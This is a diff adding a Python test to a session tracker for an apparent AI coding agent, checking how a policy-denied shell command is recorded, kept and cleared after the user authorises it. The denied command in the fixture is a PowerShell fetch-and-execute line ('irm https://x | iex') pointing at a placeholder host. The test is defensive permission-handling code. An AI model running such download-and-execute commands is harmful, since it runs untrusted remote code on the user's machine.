@@ -46,6 +46,37 @@ def test_lo_autorizado_no_vuelve_en_el_mismo_turno_y_lo_nuevo_si(aislado):  # no
     assert s["last_denied"]["detalle"] == "node cdp.mjs click"
 
 
+def test_denegacion_de_coda_conserva_su_comando_y_no_vuelve_tras_autorizarla(aislado, monkeypatch):  # noqa: F811
+    """La denegacion de coda sale del log; el comando lo pone el lienzo con last_cmd, que avanza con
+    cada comando aprobado. Mismo `at`: mismo comando y ningun anuncio nuevo; autorizada, no vuelve
+    aunque cambie last_cmd (2026-10-09, cambio de la sesion a1209581 de ar-it33940)."""
+    den = {"tool": "bash", "cause": "command-policy", "sub": False, "at": "2026-10-09T16:12:00.000Z"}
+    act = {
+        "running": True,
+        "asking": None,
+        "denied": den,
+        "last_at": None,
+        "last_tool": "bash",
+        "tools": 3,
+        "sub": False,
+    }
+    monkeypatch.setattr(ses.coda, "activity", lambda pid: act)
+    s = ses.new_session(SID, "coda", "hook")
+    s.update(pid=1, state="corriendo", last_cmd="irm https://x | iex")
+    with ses.lock:
+        st.sessions[SID] = s
+    ses.coda_log_activity(s)
+    assert s["last_denied"]["detalle"] == "irm https://x | iex"
+    visto = s["last_denied"]["visto"]
+    s["last_cmd"] = "curl.exe -sL https://y"  # coda siguio con otro comando, aprobado
+    ses.coda_log_activity(s)
+    assert s["last_denied"]["detalle"] == "irm https://x | iex" and s["last_denied"]["visto"] == visto
+    ses.autorizar_denegado(s)
+    s["last_cmd"] = "grep kiro"
+    ses.coda_log_activity(s)
+    assert s["last_denied"] is None
+
+
 def test_el_envio_con_autoriza_denegado_marca_la_tarjeta(aislado, monkeypatch):  # noqa: F811
     s = tarjeta()
     ses.set_denied(s, {**CLIC, "n": 1, "todas": [CLIC]})
